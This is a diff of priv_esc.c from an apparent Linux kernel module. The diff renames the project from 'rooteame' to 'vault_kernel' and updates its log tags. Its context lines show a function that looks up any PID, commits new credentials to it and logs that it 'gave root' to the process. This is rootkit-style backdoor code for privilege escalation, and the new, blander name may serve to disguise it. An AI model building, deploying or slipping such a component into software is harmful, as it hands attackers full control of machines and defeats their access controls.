@@ -1,4 +1,4 @@
-/* rooteame - priv_esc.c
+/* vault_kernel - priv_esc.c
  * Privilege escalation: give any process root credentials
  * ruby570bocadito © 2026
  */
@@ -11,7 +11,7 @@ int priv_esc_give_root(pid_t pid) {
 
     pid_struct = find_get_pid(pid);
     if (!pid_struct) {
-        pr_warn(ROOTEAME_TAG " give_root: PID %d not found\n", pid);
+        pr_warn(VAULT_KERNEL_TAG " give_root: PID %d not found\n", pid);
         return -ESRCH;
     }
 
@@ -19,7 +19,7 @@ int priv_esc_give_root(pid_t pid) {
     put_pid(pid_struct);
 
     if (!task) {
-        pr_warn(ROOTEAME_TAG " give_root: task for PID %d not found\n", pid);
+        pr_warn(VAULT_KERNEL_TAG " give_root: task for PID %d not found\n", pid);
         return -ESRCH;
     }
 
@@ -37,7 +37,7 @@ int priv_esc_give_root(pid_t pid) {
 
     commit_creds(new_creds);
 
-    pr_info(ROOTEAME_TAG " gave root to PID %d (%s)\n",
+    pr_info(VAULT_KERNEL_TAG " gave root to PID %d (%s)\n",
             pid, task->comm);
     return 0;
 }
